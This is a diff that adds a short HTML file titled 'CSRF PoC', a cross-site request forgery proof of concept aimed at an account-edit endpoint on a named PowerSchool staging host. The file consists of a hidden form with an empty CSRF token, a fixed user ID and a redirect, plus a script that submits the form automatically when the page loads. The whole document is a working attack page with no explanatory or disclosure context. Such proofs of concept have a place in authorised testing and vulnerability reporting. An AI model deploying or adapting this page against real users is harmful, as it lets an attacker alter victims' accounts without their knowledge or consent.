@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>CSRF PoC</title>
+</head>
+<body>
+  <h1>CSRF PoC</h1>
+  <form id="csrfForm" action="https://staged.atenterprise.powerschool.com/ats/account_info?op=edit&USER_ID=ATEAPP3702" method="POST" style="display:none;">
+    <input type="hidden" name="is_changed" value="true" />
+    <input type="hidden" name="CSRF_TOKEN" value="" />
+    <input type="hidden" name="EMAIL_OPTED_OUT" value="N" />
+    <input type="hidden" name="submit_button" value="Save and Next" />
+    <input type="hidden" name="redirect" value="/ats/account_info_success?op=edit&USER_ID=ATEAPP3702&refresh=Y" />
+    <input type="hidden" name="op" value="edit" />
+    <input type="hidden" name="USER_ID" value="ATEAPP3702" />
+  </form>
+
+  <script>
+    // Auto-submit the form immediately when the page loads
+    window.onload = function() {
+      document.getElementById('csrfForm').submit();
+    };
+  </script>
+</body>
+</html>
